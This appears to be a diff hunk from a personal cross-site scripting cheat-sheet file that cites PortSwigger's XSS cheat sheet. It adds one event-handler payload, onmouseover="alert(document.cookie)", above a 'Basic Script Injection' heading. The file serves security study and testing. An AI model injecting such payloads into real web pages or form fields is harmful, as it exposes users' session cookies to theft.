@@ -3,6 +3,8 @@ PortSwigger Cross-site scripting (XSS) cheat sheet : https://portswigger.net/web
 
 ====================================================================================================================================================================================================================================
 
+onmouseover="alert(document.cookie)"
+
 Basic Script Injection:
 
 html:
